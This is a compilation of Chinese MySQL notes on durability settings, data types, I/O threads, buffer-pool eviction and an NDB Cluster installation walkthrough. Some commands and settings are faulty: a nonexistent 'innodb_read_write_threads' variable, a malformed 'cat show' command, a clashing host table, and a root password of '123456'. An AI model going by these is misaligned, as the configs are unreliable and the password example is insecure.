运行MySQL的服务器电源使用UPS，保护MySQL服务器和存储设备不会因为断电出现异常
对于分布式应用程序，需要考虑应用程序和MySQL数据中心之间的网络
一般MySQL运行的操作系统选择Linux，如Centos。如果是自建机房，那么运行MySQL的服务器尽量单独一台，且配置高一些，磁盘最好使用ssd。

下面着重讲解MySQL关于持久化的配置

1 doublewrite buffer的打开和关闭

1.1 建议打开doublewrite buffer

InnoDB doublewrite 机制提高了InnoDB的可靠性，解决了InnoDB部分数据写入失败(即: partial page write页断裂)的问题， 保证了数据的一致性。

double write虽然是一个buffer, 但是它是开在物理文件上的一个buffer, 其实也就是file, 所以它会导致系统有更多的fsync操作, 而硬盘的fsync性能是很慢的, 从而降低mysql的整体性能。

不过 doublewrite buffer写入磁盘共享表空间这个过程是连续存储，是顺序写，性能非常高，(约占写的%10)，牺牲一点写性能来保证数据页的完整还是很有必要的。所以一般建议打开MySQL的doublewrite buffer

1.2 监控double write工作负载

mysql> show global status like '%dblwr%';
+----------------------------+---------+
| Variable_name | Value |
+----------------------------+---------+
| Innodb_dblwr_pages_written | 2432011 |
| Innodb_dblwr_writes | 188819 |
+----------------------------+---------+
2 rows in set (0.00 sec)
mysql> select (2432011/188819);
+------------------+
| (2432011/188819) |
+------------------+
| 12.8801 |
+------------------+
1 row in set (0.00 sec)
关注点：Innodb_dblwr_pages_written / Innodb_dblwr_writes

开启doublewrite后，每次脏页刷新必须要先写doublewrite，而doublewrite存在于磁盘上的是两个连续的区，每个区由连续的页组成，一般情况下一个区最多有64个页，所以一次IO写入应该可以最多写64个页。

而根据以上系统Innodb_dblwr_pages_written与Innodb_dblwr_writes的比例来看，大概在12左右，远远还没到64(如果约等于64，那么说明系统的写压力非常大，有大量的脏页要往磁盘上写)，所以从这个角度也可以看出，系统写入压力并不高。

1.3 关闭double write的场景

海量DML
不惧怕数据损坏和丢失
系统写负载成为主要负载
作为InnoDB的一个关键特性，doublewrite功能默认是开启的

mysql> show variables like '%double%';
+----------------------------------+----------------+
| Variable_name | Value |
+----------------------------------+----------------+
| innodb_doublewrite | ON |
| innodb_parallel_doublewrite_path | xb_doublewrite |
+----------------------------------+----------------+
2 rows in set (0.01 sec)
2 innodb_flush_log_at_trx_commit的配置

innodb_flush_log_at_trx_commit：是 InnoDB 引擎特有的，ib_logfile的刷新方式（ ib_logfile：记录的是redo log和undo log的信息）， 其取值可以为0， 1， 2

innodb_flush_log_at_trx_commit=0: Innodb 中的Log Thread每隔1 秒钟会将log buffer中的数据写入到文件，同时还会通知文件系统进行文件同步的flush 操作，保证数据确实已经写入到磁盘上面的物理文件。但是，每次事务的结束（commit 或者是rollback）并不会触发Log Thread 将log buffer 中的数据写入文件。所以，当设置为0 的时候，当MySQL Crash 和OS Crash 或者主机断电之后，最极端的情况是丢失1 秒时间的数据变更。

innodb_flush_log_at_trx_commit=1: Innodb 的默认设置，表示在每次事务提交的时候，都把log buffer刷到文件系统中(os buffer)去，并且调用文件系统的“flush”操作将缓存刷新到磁盘上去。这样的话，数据库对IO的要求就非常高了，如果底层的硬件提供的IOPS比较差，那么MySQL数据库的并发很快就会由于硬件IO的问题而无法提升。

innodb_flush_log_at_trx_commit=2: 表示在每次事务提交的时候会把log buffer刷到文件系统中去，但并不会立即刷写到磁盘。如果只是MySQL数据库挂掉了，由于文件系统没有问题，那么对应的事务数据并没有丢失。只有在数据库所在的主机操作系统损坏或者突然掉电的情况下，数据库的事务数据可能丢失1秒之类的事务数据。这样的好处，减少了事务数据丢失的概率，而对底层硬件的IO要求也没有那么高(log buffer写到文件系统中，一般只是从log buffer的内存转移的文件系统的内存缓存中，对底层IO没有压力)。

[玩转MySQL之九]MySQL实现ACID机制之持久性
3 sync_binlog的配置

sync_binlog: 是MySQL 的二进制日志（binary log）同步到磁盘的频率。其可取的值是: 0 ~ N

sync_binlog=0: 当事务提交之后，MySQL不做fsync之类的磁盘同步指令刷新binlog_cache中的信息到磁盘，而让Filesystem自行决定什么时候来做同步，或者cache满了之后才同步到磁盘。这个是性能最好的。

sync_binlog=1: 当每进行1次事务提交之后，MySQL将进行一次fsync之类的磁盘同步指令来将binlog_cache中的数据强制写入磁盘。

sync_binlog=N: 当每进行n次事务提交之后，MySQL将进行一次fsync之类的磁盘同步指令来将binlog_cache中的数据强制写入磁盘。

大多数情况下，对数据的一致性并没有很严格的要求，所以并不会把 sync_binlog 配置成 1. 为了追求高并发，提升性能，可以设置为 100 或直接用 0.

而和 innodb_flush_log_at_trx_commit 一样，对于支付服务这样的应用，还是比较推荐 sync_binlog = 1.

4 innodb_file_per_table配置

Innodb存储引擎可将所有数据存放于ibdata*的共享表空间，也可将每张表存放于独立的.ibd文件的独立表空间。

共享表空间以及独立表空间都是针对数据的存储方式而言的。

4.1 共享表空间

某一个数据库的所有的表数据，索引文件全部放在一个文件中，默认这个共享表空间的文件路径在data目录下。 默认的文件名为:ibdata1 初始化为10M。

这个表空间可以由很多个文件组成，一个表可以跨多个文件存在，所以其大小限制不再是文件大小的限制，而是其自身的限制。从Innodb的官方文档中可以看到，其表空间的最大限制为64TB，也就是说，Innodb的单表限制基本上也在64TB左右了，当然这个大小是包括这个表的所有索引等其他相关数据。

共享表空间的优点
1) 可以将表空间分成多个文件存放到各个磁盘上（表空间文件大小不受表大小的限制，如一个表可以分布在不同的文件上）。

2) 数据和文件放在一起方便管理。

共享表空间的缺点
1) 所有的数据和索引存放到一个文件，虽然可以把一个大文件分成多个小文件，但是多个表及索引在表空间中混合存储，当数据量非常大的时候，表做了大量删除操作后表空间中将会有大量的空隙，特别是对于统计分析，对于经常删除操作的这类应用最不适合用共享表空间。

2) 共享表空间分配后不能回缩：当出现临时建索引或是创建一个临时表的操作表空间扩大后，就是删除相关的表也没办法回缩那部分空间了（可以理解为oracle的表空间10G，但是才使用10M，但是操作系统显示mysql的表空间为10G），进行数据库的冷备很慢；

4.2 独立表空间

每一个表都将会生成以独立的文件方式来进行存储，每一个表都有一个.frm表描述文件，还有一个.ibd文件。 其中这个文件包括了单独一个表的数据内容以及索引内容，默认情况下它的存储位置也是在表的位置之中。

独立表空间的优点
1) 每个表都有自已独立的表空间。

2) 每个表的数据和索引都会存在自已的表空间中。

3) 可以实现单表在不同的数据库中移动。

4) 空间可以回收（除drop table操作处，表空间不能自已回收）

i: Drop table操作自动回收表空间，如果对于统计分析或是日值表，删除大量数据后可以通过:alter table TableName engine=innodb;回缩不用的空间。

ii: 对于使innodb-plugin的Innodb使用turncate table也会使空间收缩

iii: 对于使用独立表空间的表，不管怎么删除，表空间的碎片不会太严重的影响性能，而且还有机会处理。

独立表空间的缺点
1) 单表增加过大，当单表占用空间过大时，存储空间不足，只能从操作系统层面思考解决方法；

2) 单表增加过大，如超过100个G，相比较之下，使用独占表空间的效率以及性能会更高一点。

4.3 结论

共享表空间在Insert操作上少有优势。其它都没独立表空间表现好。当启用独立表空间时，请合理调整一 下：innodb_open_files 。InnoDB Hot Backup（冷备）的表空间cp不会面对很多无用的copy了。而且利用innodb hot backup及表空间的管理命令可以实现单现移动。
```

### 支持多钟数据类型
```
MySQL 数据类型
MySQL中定义数据字段的类型对你数据库的优化是非常重要的。

MySQL支持多种类型，大致可以分为三类：数值、日期/时间和字符串(字符)类型。

数值类型
MySQL支持所有标准SQL数值数据类型。

这些类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL和NUMERIC)，以及近似数值数据类型(FLOAT、REAL和DOUBLE PRECISION)。

关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。

BIT数据类型保存位字段值，并且支持MyISAM、MEMORY、InnoDB和BDB表。

作为SQL标准的扩展，MySQL也支持整数类型TINYINT、MEDIUMINT和BIGINT。下面的表显示了需要的每个整数类型的存储和范围。

类型	大小	范围（有符号）	范围（无符号）	用途
TINYINT	1 byte	(-128，127)	(0，255)	小整数值
SMALLINT	2 bytes	(-32 768，32 767)	(0，65 535)	大整数值
MEDIUMINT	3 bytes	(-8 388 608，8 388 607)	(0，16 777 215)	大整数值
INT或INTEGER	4 bytes	(-2 147 483 648，2 147 483 647)	(0，4 294 967 295)	大整数值
BIGINT	8 bytes	(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)	(0，18 446 744 073 709 551 615)	极大整数值
FLOAT	4 bytes	(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)	0，(1.175 494 351 E-38，3.402 823 466 E+38)	单精度
浮点数值
DOUBLE	8 bytes	(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)	0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)	双精度
浮点数值
DECIMAL	对DECIMAL(M,D) ，如果M>D，为M+2否则为D+2	依赖于M和D的值	依赖于M和D的值	小数值
日期和时间类型
表示时间值的日期和时间类型为DATETIME、DATE、TIMESTAMP、TIME和YEAR。

每个时间类型有一个有效值范围和一个"零"值，当指定不合法的MySQL不能表示的值时使用"零"值。

TIMESTAMP类型有专有的自动更新特性，将在后面描述。

类型	大小
( bytes)	范围	格式	用途
DATE	3	1000-01-01/9999-12-31	YYYY-MM-DD	日期值
TIME	3	'-838:59:59'/'838:59:59'	HH:MM:SS	时间值或持续时间
YEAR	1	1901/2155	YYYY	年份值
DATETIME	8	1000-01-01 00:00:00/9999-12-31 23:59:59	YYYY-MM-DD HH:MM:SS	混合日期和时间值
TIMESTAMP	4	
1970-01-01 00:00:00/2038

结束时间是第 2147483647 秒，北京时间 2038-1-19 11:14:07，格林尼治时间 2038年1月19日 凌晨 03:14:07

YYYYMMDD HHMMSS	混合日期和时间值，时间戳
字符串类型
字符串类型指CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM和SET。该节描述了这些类型如何工作以及如何在查询中使用这些类型。

类型	大小	用途
CHAR	0-255 bytes	定长字符串
VARCHAR	0-65535 bytes	变长字符串
TINYBLOB	0-255 bytes	不超过 255 个字符的二进制字符串
TINYTEXT	0-255 bytes	短文本字符串
BLOB	0-65 535 bytes	二进制形式的长文本数据
TEXT	0-65 535 bytes	长文本数据
MEDIUMBLOB	0-16 777 215 bytes	二进制形式的中等长度文本数据
MEDIUMTEXT	0-16 777 215 bytes	中等长度文本数据
LONGBLOB	0-4 294 967 295 bytes	二进制形式的极大文本数据
LONGTEXT	0-4 294 967 295 bytes	极大文本数据
注意：char(n) 和 varchar(n) 中括号中 n 代表字符的个数，并不代表字节个数，比如 CHAR(30) 就可以存储 30 个字符。

CHAR 和 VARCHAR 类型类似，但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。

BINARY 和 VARBINARY 类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字符串而不要非二进制字符串。也就是说，它们包含字节字符串而不是字符字符串。这说明它们没有字符集，并且排序和比较基于列值字节的数值值。

BLOB 是一个二进制大对象，可以容纳可变数量的数据。有 4 种 BLOB 类型：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。它们区别在于可容纳存储范围不同。

有 4 种 TEXT 类型：TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。对应的这 4 种 BLOB 类型，可存储的最大长度不同，可根据实际情况选择。

```

### 可利用 CPU 多核心
```
在工作中可能遇到这样的情况，随着业务的增长，用户量也在逐渐增长，终究有一天，一到高峰期，数据库服务器CPU利用率直飚100%。

最简单的做法就是直接提升硬件性能，简单粗暴，直接有效。

假如我们最开始的服务器CPU核数是4，然后我们觉得4个有点扛不住，那就直接给他搞16个核。这下应该没啥问题了吧，用户访问站点貌似也比以前快了。但是不要高兴太早，当你打开任务管理器，你会发现利用率高的还是以前那几个核，或者说只有4个用的比较多，其它12位大爷感觉不接茬。

如果你去查一下innodb_read_io_threads和innodb_write_io_threads这两个变量的时候，你就回发现，它们的默认值是4。可以用以下语句查看这两个变量的值：

show variables like '%_io_threads'

那就往大放呗。如果你直接用set命令去修改，你就回发现，人家会告你这俩命令是只读变量。那好吧，只能在初始化文件中添加这两个变量了。找到mysql的安装目录，用管理员身份打开mysql.ini文件，在最后添加这么两句：

innodb_read_io_threads=16
innodb_read_write_threads=16

重启MySQL服务，再去观察一下任务管理器，你就会发现，这次任务分配到每个处理器的任务量就均匀了些。
```

### 内存淘汰机制
```
http://www.mamicode.com/info-detail-2679625.html
首先我们说一下大查询会不会把内存打爆？

比如说主机内存有5g，但是我们一个大查询的数据有10g，这样会不会把内存打爆呢？

答案：不会

为什么？

因为mysql读取数据是采取边读边发的策略

select * from t1

这条语句的流程是这样的

技术图片

 

1.读取数据放入net_buffer中，net_buffer大小是由net_buffer_length控制

2.net_buffer放满了以后，调用网络栈发送数据到客户端

3.如果发送成功就清空net_buffer，继续读取数据放入net_buffer中

4.如果发送函数返回EAGAIN或者WSAEWOULDBLOCK就表示本地网络栈满了，这时候就进入等待，知道网络栈重新可写，再继续发送。

根据这个流程来看，读取数据的时候占用的内存最多也就是net_buffer的大小。

 

InnoDB内存（buffer pool）管理

我们都知道mysql查询数据是先看内存中有没有数据，如果没有就从磁盘中读出来，然后在读入内存

所以说bufferpool对查询有加速效果，加速效果依赖于一个指标也就是内存命中率，如果命中率能达到100%那是最好的

通过

show engine innodb status

可以查看命中率

innodb buffer pool的大小是由参数innodb_buffer_pool_size控制的，一般设置为可用物理内存的60%-80%

 

内存淘汰

 

既然内存是一块固定大小的，那么存放在内存里的数据就肯定有的会被淘汰

下面是一个lur算法的基本模型

技术图片

 

innodb管理bufferpool的lru算法是基于链表实现的

state1:我们要查询p3的数据，由于p3是在内存中的，那么久直接把p3移动到链表头部，

也就是对应图中state2的状态

state3中由于我们查询的px数据不是在px中，那么就从磁盘中查询出px的数据放入链表头部，

但是由于内存满了，所以

就会把pm的数据从链表尾部淘汰掉，从现象上来看就是最久没有被访问都的数据会被淘汰

 

这种算法对于mysql来说有什么问题？？

如果我们对一个冷数据表进行全表扫描，比如说日志表，这些不是正常用户访问的表，

那么在bufferpool中就会大量存在这些数据的表，那么就会导致用户正常访问存放的业务数据会被淘汰掉，

就会导致大量数据需要重新读磁盘放入内存，这样性能就会大大降低

 

mysql肯定不会允许这种情况发生的，所以它基于上面的lru算法做了改进

下图就是改进后的模型

技术图片

 

 innodb把整个内存的前八分之五记为young区域，后八分之三记为old区域，

我们看上图state1中由于我们访问的p3是在young区域，那么就把p3移动到链表头部

但是如果我们访问的数据如果是在old区域，比如说我们访问了px，这个时候会做个判断

如果px在内存中存活时间超过1秒，就会把它移动到young区域的链表头部，否则位置不动

这个1秒是由参数

innodb_old_blocks_time控制的，默认值是1000，单位毫秒

 

这样我们在看扫描全表的步骤

扫描过程中被访问的数据页会被放在old区域

一个数据页有多条记录会被访问，所以这数据页会被多次访问到，但是由于是顺序扫描，

这个数据页第一次被访问和最后一次被访问的时间间隔不会超过一秒，所以就会一直在old区域

在继续扫描后面的数据页，之前的这个数据页也不会被访问到，因此就会一直在old区域，也就很快就会被淘汰掉了

 

可以看到这个策略的最大收益，就是在扫描的过程中，虽然也用到了bufferpool，

但是不会对young区域造成影响，也就保证了bufferpool响应业务的内存命中率
```

### 集群 Cluster
```
1. 参考文档
http://xuwensong.elastos.org/2014/01/13/ubuntu-%E4%B8%8Bmysql-cluster%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/

2. 简介
MySQL-Cluster是一种技术，该技术允许在无共享的系统中部署“内存中”数据库的簇。通过无共享体系结构，系统能够使用廉价的硬件，而且对软硬件无特殊要求。此外，由于每个组件都有自己的内存和磁盘，所以不存在单点故障。

MySQL簇将标准的MySQL服务器与名为NDB的“内存中”的簇式存储引擎集成了起来。术语NDB指的是与存储引擎相关的设置部分，而术语“MySQL簇”指的是MySQL和NDB存储引擎的组合。

MySQL簇由一组计算机构成，每台计算机上均运行着多种进程，包括MySQL服务器，NDB簇的数据节点，管理服务器（MGM），以及（可能）专门的数据访问程序。关于簇中组件的关系，如下图：

 

所有这些程序一起构成了MySQL簇。将数据保存到NBD簇引擎中时，表将保存在数据节点内。能够从簇中所有其他MySQL服务器直接访问这些表。因此，假如在将数据保存在簇内的工资应用程序中，如果某一应用程序更新了一位雇员的工资，所有查询该数据的其他MySQL 服务器能立刻发现这种变化。

对于MySQL簇，保存在数据节点的数据可被映射，簇能够处理单独数据节点的故障，除了少数事物将因事物状态丢失而被放弃外，不会产生其他影响。由于事物性应用程序能够处理失败事宜，因而它不是问题源。

3. MySQL簇的基本概念
NDB 是一种“内存中”存储引擎，它具有可用性高和数据一致性好的特点。

能够使用多种故障切换和负载平衡选项配置NDB 存储引擎，但以簇层面上的存储引擎开始最简单。MySQL簇的NDB存储引擎包含完整的数据集，仅取决于簇本身内的其他数据。

下面名，我们将介绍设置由NDB存储引擎和一些MySQL服务器构成的MySQL簇的设置方法。

目前，MySQL簇的部分可以独立于MySQL服务器进行配置。在MySQL簇中，簇的每个部分被视为一个节点。

注释：在很多情况下，术语“节点”用于指计算机，但在讨论MySQL簇时，它表示的是进程。在单台计算机上可以有任意数目的节点，所以我们才有可能将多个不同功能的节点配置在同一台计算机上，为此，我们采用术语簇主机。

有三类簇节点，在最低的MySQL簇配置中，至少有三个节点，这三类节点分别是：

管理节点（MGM）：这类节点的作用是管理MySQL簇内的其他节点，如提供配置数据，启动并停止节点，运行备份等。由于这类节点负责管理其他节点的配置，所以管理节点应在其他节点之前先启动。MGM节点是用命令ndb_mgm启动的。

数据节点（NDB）：这类节点用于保存簇的数据。数据集点的数目与副本的数目相关，是片段的倍数。例如，对于两个副本，每个副本又两个片段，那么就有4个数据节点。没有必要有一个以上的副本。。数据节点是用命令ndbd来启动的。

SQL节点：这类节点是用来访问簇数据的节点。对于MySQL簇，客户端节点是使用NDB 簇存储引擎的传统MySQL服务器。典型情况下，SQL节点是使用命令mysql -ndbcluster来启动的，或将ndbcluster添加到my.cnf后面使用mysqld启动。

簇配置包括对簇中单独节点的配置，以及设置节点之间的单独通信链路。对于目前设计的MySQL簇，其意图在于，从处理器的能力，内存空间和宽带来讲，存储节点是同质的，此外，为了提供单一的配置点，作为整体，簇的所有配置均位于一个文件中。

管理服务器（MGM节点）负责管理簇配置文件和簇日志。簇中的每个节点从管理服务器检索配置数据，并请求确定管理服务器所在的位置的方式。当数据节点内出现有趣的事件时，节点将关于这类事件的信息传输到管理服务器，然后，啊经这类信息写入簇日志。



4. 实现环境
现在，我们计划建立有5个节点的MySQL CLuster体系，因此需要用到3台机器(sql和数据节点共用)，分别做如下用途：

                 节点(用途)                 IP地址(主机名)
                 管理节点(MGM)              10.24.0.101(db1) nodeid = 1

                 数据节点1(NDBD1)           10.24.6.4 (db4) nodeid = 11
                 数据节点2(NDBD2)           10.24.6.6(db5) nodeid =12
                 SQL节点1(SQL1)            10.24.6.4(db2) nodeid = 21
                 SQL节点2(SQL2)            10.24.6.6(db3) nodeid = 22

5. MySQL-Cluster安装包下载
对于MySQL-Cluster的安装包下载，下载地址见http://dev.mysql.com/downloads/cluster/

mysql-cluster-gpl-7.4.7-debian7-x86_64.deb

6. 安装
6.1. 清除之前的mysql痕迹
此外 如果之前安装过mysql-server，在进行此次实验之前，需要将mysql-server卸载，执行以下指令卸载mysql

sudo apt-get autoremove --purge mysql-server

sudo apt-get remove mysql-server

sudo apt-get autoremove mysql-server

sudo apt-get remove mysql-common (非常重要)

6.2. 安装deb文件
sudo dpkg -i mysql-cluster-gpl-7.4.7-debian7-x86_64.deb

安装目录/opt/mysql/server-5.6

6.3. 存储节点/SQL节点安装
SQL节点和数据节点的安装步骤基本相同，所以在设计为存储节点或SQL节点的的每一台机器上，以系统根用户身份执行以下步骤：

mysql组和mysql用户

检查/etc/passwd和/etc/group/文件，查看在系统上是否已经存在mysql组和mysql用户，这时因为某些操作系统会将其作为安装进程的一部分创建。可以使用以下指令查看：

cat show /etc/passwd

cat show /etc/group

如果它们不存在，则需要创建新的mysql用户组，然后为该组添加一个mysql用户

groupadd mysql

useradd -g mysql mysql

6.4. 创建系统数据库的脚本
sudo /opt/mysql/server-5.6/scripts/mysql_install_db --user=mysql

如果此脚本不能运行，若报错为主机名不匹配的话，则很有可能是下载的版本不对，查看操作系统是32位还是64位，选择正确的版本。若报错找不到默认的文件，则很有可能是因为之前的mysql-server没有卸载，执行上文提供的指令，彻底卸载mysql-server

成功结果：

To start mysqld at boot time you have to copy

support-files/mysql.server to the right place for your system

PLEASE REMEMBER TO SET A PASSWORD FOR THE MySQL root USER !

To do so, start the server, then issue the following commands:

  /opt/mysql/server-5.6/bin/mysqladmin -u root password 'new-password'

  /opt/mysql/server-5.6/bin/mysqladmin -u root -h drbd01 password 'new-password'

Alternatively you can run:

  /opt/mysql/server-5.6/bin/mysql_secure_installation

which will also give you the option of removing the test

databases and anonymous user created by default.  This is

strongly recommended for production servers.

See the manual for more instructions.

You can start the MySQL daemon with:

  cd /opt/mysql/server-5.6 ; /opt/mysql/server-5.6/bin/mysqld_safe &

You can test the MySQL daemon with mysql-test-run.pl

  cd mysql-test ; perl mysql-test-run.pl

Support MySQL by buying support/licenses at http://shop.mysql.com

WARNING: Found existing config file /opt/mysql/server-5.6/my.cnf on the system.

Because this file might be in use, it was not replaced,

but was used in bootstrap (unless you used --defaults-file)

and when you later start the server.

The new default config file was created as /opt/mysql/server-5.6/my-new.cnf,

please compare it with your file and take the changes you need.

6.5.设置MySQL服务器和数据目录必要的权限
chown -R root .

chown -R mysql data

3

chgrp -R mysql .

6.6. 拷贝mysql.server
 	 
 	 
sudo cp /opt/mysql/server-5.6/support-files/mysql.server /etc/init.d/mysql

chmod +x /etc/init.d/mysql

6.7. 拷贝 my.cnf
sudo cp /opt/mysql/server-5.6/my-new.cnf /etc/my.cnf

sudo vim /etc/my.cnf

 

 

6.8. 设置root密码
sudo apt-get install mysql-client

mysqladmin -u root flush-privileges password "123456"

 

6.9. 管理节点安装
对于管理（MGM）节点，不需要安装mysqld可执行文件，仅需要安装用于MGM服务器和客户端的二进制文件，这类文件可在下载的档案文件中找到。假定将下载的档案文件放在了/var/tmp文件下，以系统管理员的身份执行以下步骤，在簇管理节点主机上安装ndb_mgmd和ndb_mgm

ndb_mgmd：ndb管理服务器

ndb_mgm: ndb管理客户端

6.10. 安装deb文件
sudo dpkg -i mysql-cluster-gpl-7.4.7-debian7-x86_64.deb

安装目录/opt/mysql/server-5.6

 

6.11. 创建管理目录
sudo mkdir /usr/local/mysql/

6.12. 拷贝ndb管理程序
sudo cp /opt/mysql/server-5.6/bin/ndb_mgm* /usr/local/mysql/

6.13. 端口
注释：簇管理节点的默认端口是1186,数据节点的默认端后是2202。

 



6.14.  配置ndb管理节点
cd /usr/local/mysql/

sudo vim config.ini：

 

# Options affecting ndbd processes on all data nodes:

[NDBD DEFAULT]

NoOfReplicas=2

DataMemory=80M

IndexMemory=18M

 

# TCP/IP options:

[TCP DEFAULT]

#portnumber=2202

 

# Management process options:

[NDB_MGMD]

nodeid=1

HostName=10.24.0.101

DataDir=/usr/local/mysql

 

# Options for data node :

[NDBD]

nodeid=11

HostName=10.24.6.4

DataDir=/opt/mysql/server-5.6/data/

 

# Options for data node :

[NDBD]

nodeid=12

HostName=10.24.6.6

DataDir=/opt/mysql/server-5.6/data/

 

# SQL node options:

[MYSQLD]

nodeid=21

HostName=10.24.6.4

[MYSQLD]

nodeid=22

HostName=10.24.6.6

 

 



7. 启动
完成配置后，启动簇并不困难。必须在数据节点所在的主机上分别启动每个簇节点进程。尽管能够按任何顺序启动节点，但还是建议，首先启动管理节点，然后启动存储节点，最后启动SQL节点。

7.1. 管理节点启动
可使用nbd_mgm指令登录到ndb_mgm客户端，登录后，可使用show指令来查看簇中个节点情况。

注意，启动MGM时，必须用-f或者–config-file选项，告诉ndb_mgmd到哪里找到配置文件。首次启动时必须选用–initial选项，或者更改了MGM节点的配置信息后，也需选用–initial选项。

 

sudo /usr/local/mysql/ndb_mgmd -f /usr/local/mysql/config.ini

 

Ndb客户端查看:

 

wiki@zoweewiki:/usr/local/mysql$ /usr/local/mysql/ndb_mgm

-- NDB Cluster -- Management Client --

ndb_mgm>

ndb_mgm>

ndb_mgm>

ndb_mgm> show

Connected to Management Server at: localhost:1186

Cluster Configuration

---------------------

[ndbd(NDB)]     2 node(s)

id=11   @10.24.6.4  (mysql-5.6.25 ndb-7.4.7, Nodegroup: 0, *)

id=12   @10.24.6.6  (mysql-5.6.25 ndb-7.4.7, Nodegroup: 0)

 

[ndb_mgmd(MGM)] 1 node(s)

id=1    @10.24.0.101  (mysql-5.6.25 ndb-7.4.7)

 

[mysqld(API)]   2 node(s)

id=21   @10.24.6.4  (mysql-5.6.25 ndb-7.4.7)

id=22   @10.24.6.6  (mysql-5.6.25 ndb-7.4.7)



7.2. 数据节点启动
在每台数据节点主机上，对于首次启动，运行下述命令启动NDBD进程：

sudo /opt/mysql/server-5.6/bin/ndbd --initial

注意，应仅在首次启动时ndbd时，或者在备份/恢复或者配置变化后重启ndbd时使用“–initial”参数，这很重要，因为该参数会使数据节点删除由早期ndbd实例创建的，用于恢复的任何文件，包括恢复用日志文件。

 

7.3. MYSQL节点启动
sudo /etc/init.d/mysql restart

 

启动日志：

/opt/mysql/server-5.6/data/drbd02.err

151015 14:33:19 mysqld_safe Starting mysqld daemon with databases from /opt/mysql/server-5.6/data

2015-10-15 14:33:22 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit_defaults_for_timestamp server option (see documentation for more details).

2015-10-15 14:33:22 0 [Note] /opt/mysql/server-5.6/bin/mysqld (mysqld 5.6.25-ndb-7.4.7-cluster-gpl-log) starting as process 15192 ...

2015-10-15 14:33:23 15192 [Note] Plugin 'FEDERATED' is disabled.

2015-10-15 14:33:23 15192 [Note] InnoDB: Using atomics to ref count buffer pool pages

2015-10-15 14:33:23 15192 [Note] InnoDB: The InnoDB memory heap is disabled

2015-10-15 14:33:23 15192 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins

2015-10-15 14:33:23 15192 [Note] InnoDB: Memory barrier is not used

2015-10-15 14:33:23 15192 [Note] InnoDB: Compressed tables use zlib 1.2.3

2015-10-15 14:33:23 15192 [Note] InnoDB: Using Linux native AIO

2015-10-15 14:33:23 15192 [Note] InnoDB: Not using CPU crc32 instructions

2015-10-15 14:33:23 15192 [Note] InnoDB: Initializing buffer pool, size = 128.0M

2015-10-15 14:33:23 15192 [Note] InnoDB: Completed initialization of buffer pool

2015-10-15 14:33:24 15192 [Note] InnoDB: Highest supported file format is Barracuda.

2015-10-15 14:33:24 15192 [Note] InnoDB: 128 rollback segment(s) are active.

2015-10-15 14:33:24 15192 [Note] InnoDB: Waiting for purge to start

2015-10-15 14:33:24 15192 [Note] InnoDB: 5.6.25 started; log sequence number 1626027

2015-10-15 14:33:24 15192 [Note] NDB: Changed global value of binlog_format from STATEMENT to MIXED

2015-10-15 14:33:24 15192 [Note] NDB: NodeID is 22, management server '10.24.0.101:1186'

2015-10-15 14:33:25 15192 [Note] NDB[0]: NodeID: 22, all storage nodes connected

2015-10-15 14:33:25 15192 [Warning] NDB: server id set to zero - changes logged to bin log with server id zero will be logged with another server id by slave mysqlds

2015-10-15 14:33:25 15192 [Note] NDB Binlog: Starting...

2015-10-15 14:33:25 15192 [Note] NDB Util: Starting...

2015-10-15 14:33:25 15192 [Note] NDB Index Stat: Starting...

2015-10-15 14:33:25 15192 [Note] NDB Index Stat: Wait for server start completed

2015-10-15 14:33:25 15192 [Note] NDB Util: Wait for server start completed

2015-10-15 14:33:25 15192 [Note] NDB Binlog: Started

2015-10-15 14:33:25 15192 [Note] NDB Binlog: Setting up

2015-10-15 14:33:25 15192 [Note] NDB Binlog: Created schema Ndb object, reference: 0x80040016, name: 'Ndb Binlog schema change monitoring'

2015-10-15 14:33:25 15192 [Note] NDB Binlog: Created injector Ndb object, reference: 0x80050016, name: 'Ndb Binlog data change monitoring'

2015-10-15 14:33:25 15192 [Note] NDB Binlog: Setup completed

2015-10-15 14:33:25 15192 [Note] NDB Binlog: Wait for server start completed

2015-10-15 14:33:25 15192 [Note] Server hostname (bind-address): '*'; port: 3306

2015-10-15 14:33:25 15192 [Note] IPv6 is available.

2015-10-15 14:33:25 15192 [Note]   - '::' resolves to '::';

2015-10-15 14:33:25 15192 [Note] Server socket created on IP: '::'.

2015-10-15 14:33:25 15192 [Note] Event Scheduler: Loaded 0 events

2015-10-15 14:33:25 15192 [Note] /opt/mysql/server-5.6/bin/mysqld: ready for connections.

Version: '5.6.25-ndb-7.4.7-cluster-gpl-log'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  MySQL Cluster Community Server (GPL)

2015-10-15 14:33:25 15192 [Note] NDB Util: Wait for cluster to start

2015-10-15 14:33:25 15192 [Note] NDB Util: Started

2015-10-15 14:33:25 15192 [Note] NDB Binlog: Check for incidents

2015-10-15 14:33:25 15192 [Note] NDB Binlog: Wait for cluster to start

2015-10-15 14:33:25 15192 [Note] NDB Index Stat: Wait for cluster to start

2015-10-15 14:33:25 15192 [Note] ndb_index_stat_proc: Created Ndb object, reference: 0x80070016, name: 'Ndb Index Statistics monitoring'

2015-10-15 14:33:25 15192 [Note] NDB Index Stat: Started

2015-10-15 14:33:26 15192 [Note] NDB Binlog: DISCOVER TABLE Event: REPL$mysql/ndb_schema

2015-10-15 14:33:26 15192 [Note] NDB Binlog: logging ./mysql/ndb_schema (UPDATED,USE_WRITE)

2015-10-15 14:33:26 15192 [Note] NDB Binlog: DISCOVER TABLE Event: REPL$mysql/ndb_apply_status

2015-10-15 14:33:26 15192 [Note] NDB Binlog: logging ./mysql/ndb_apply_status (UPDATED,USE_WRITE)

